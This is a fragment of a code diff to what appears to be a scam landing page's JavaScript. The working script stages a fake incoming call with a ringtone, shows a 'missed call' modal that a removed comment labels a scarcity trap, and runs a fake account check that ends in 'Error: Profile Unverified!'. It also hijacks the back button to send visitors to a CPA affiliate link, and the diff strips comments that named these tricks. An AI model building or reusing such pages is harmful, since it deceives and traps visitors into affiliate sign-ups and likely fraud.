+                    VERIFY FREE & JOIN LIVE
                 </a>
             </div>
 
@@ -216,7 +223,6 @@
         let audioUnlocked = false;
         let callTriggered = false;
 
-        // Unlock audio context on first interaction
         function initAudioContext() {
             if(!audioUnlocked) {
                 ringtone.play().then(() => {
@@ -227,14 +233,13 @@
             }
         }
 
-        // Timer for automated call (20 seconds)
+        // Call automatically after 20 seconds
         setTimeout(() => {
             if(!callTriggered) { triggerIncomingCall(); }
         }, 20000);
 
         function triggerManualVerification() {
             if(!callTriggered) {
-                // If they click early, simulate the call instantly instead of waiting
                 triggerIncomingCall(); 
             }
         }
@@ -245,13 +250,11 @@
             callScreen.classList.remove('hidden');
             callScreen.classList.add('flex');
             
-            // Play ringtone
-            ringtone.play().catch(e => console.log("Autoplay blocked, showing UI only"));
+            ringtone.play().catch(e => console.log("Autoplay blocked"));
 
-            // Fade in
             setTimeout(() => { callScreen.classList.remove('opacity-0'); }, 50);
 
-            // Ring for 8 seconds then drop automatically if no answer
+            // Ringing drops after 8 seconds
             setTimeout(() => {
                 if(!document.getElementById('incomingCallScreen').classList.contains('hidden')) {
                     dropCall();
@@ -263,11 +266,9 @@
             ringtone.pause();
             ringtone.currentTime = 0;
             
-            // Hide Call Screen
             document.getElementById('incomingCallScreen').classList.add('hidden');
             document.getElementById('incomingCallScreen').classList.remove('flex');
             
-            // Show Scarcity Trap Modal
             const modal = document.getElementById('missedCallModal');
             modal.classList.remove('hidden');
             modal.classList.add('flex');
@@ -296,7 +297,7 @@
             const progress = document.getElementById('progressBar');
             
             setTimeout(() => { txt.innerText = "Checking Account Status..."; progress.style.width = "40%"; }, 1000);
-            setTimeout(() => { txt.innerText = "Error: Unverified Profile!"; progress.style.width = "80%"; }, 2500);
+            setTimeout(() => { txt.innerText = "Error: Profile Unverified!"; progress.style.width = "80%"; }, 2500);
             setTimeout(() => { 
                 document.getElementById('loadingStep').classList.add('hidden');
                 document.getElementById('finalStep').classList.remove('hidden');
@@ -305,7 +306,7 @@
             progress.style.width = "10%";
         }
 
-        // Back button trap
+        // Redirect back button trap directly to CPA link
         history.pushState(null, null, location.href);
         window.onpopstate = function () { window.location.href = CPA_LINK; };
     </script>
